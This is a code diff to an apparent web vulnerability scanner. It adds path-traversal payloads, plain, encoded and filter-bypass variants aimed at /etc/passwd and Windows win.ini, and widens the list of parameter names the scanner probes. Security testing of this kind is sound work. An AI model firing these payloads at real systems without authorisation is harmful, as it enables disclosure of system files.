@@ -22,16 +22,25 @@ logger = logging.getLogger(__name__)
 # ── Payloads ──────────────────────────────────────────────────────────────────
 
 TRAVERSAL_PAYLOADS: list[str] = [
+    "/etc/passwd",
     "../etc/passwd",
     "../../etc/passwd",
     "../../../etc/passwd",
     "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "../../../../../../etc/passwd",
     "..%2Fetc%2Fpasswd",
     "..%252Fetc%252Fpasswd",
+    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
     "....//....//etc/passwd",
+    "....//....//....//....//etc/passwd",
     # Windows
+    "windows\\win.ini",
+    "/windows/win.ini",
     "..\\windows\\win.ini",
     "..\\..\\windows\\win.ini",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
     "..%5Cwindows%5Cwin.ini",
 ]
 
@@ -41,7 +50,8 @@ _FILE_PARAM_KEYWORDS = frozenset({
     "include", "require", "load", "read", "template", "view",
     "action", "content", "layout", "module", "name", "show",
     "img", "image", "download", "src", "source", "ad", "newsad",
-    "item", "report", "attachment", "uri", "url",
+    "item", "report", "attachment", "uri", "url", "pic", "tag",
+    "aid", "filename", "file_name", "avatar", "photo",
 })
 
 # OS-specific indicators that confirm successful file read
